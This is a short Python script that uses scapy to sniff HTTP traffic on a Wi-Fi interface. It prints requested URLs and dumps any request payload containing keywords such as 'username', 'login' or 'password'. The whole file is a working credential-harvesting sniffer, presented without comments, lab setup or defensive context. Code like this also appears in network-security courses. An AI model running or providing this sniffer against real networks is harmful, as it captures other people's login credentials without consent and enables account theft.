import scapy.all as scapy
from scapy.layers import http

stop_sniffing = False

keywords=('username','user','uname','login','password','pass','psw','signin','signup','name')

def sniff(interface):
    while stop_sniffing == False:
        scapy.sniff(iface=interface,store=False,prn=process_packet,stop_filter=stop_filter,timeout=3)

def stop_filter(packet):
    return stop_sniffing == True

def get_url(packet):
    return (packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path).decode('utf-8')

def process_packet(packet):
    cred=None
    if packet.haslayer(http.HTTPRequest):
        url=get_url(packet)
        print(f"HTTP url is: {url}")
        cred=get_credentials(packet)
    if cred:
        print(f"print possible credential info:\n {cred}")

def get_credentials(packet):
    if packet.haslayer(scapy.Raw):
        field_load = packet[scapy.Raw].load.decode('utf-8')
        for keyword in keywords:
            if keyword in field_load:
                return field_load

def main():
    sniff("Wi-Fi")

if __name__ == "__main__":
    main()
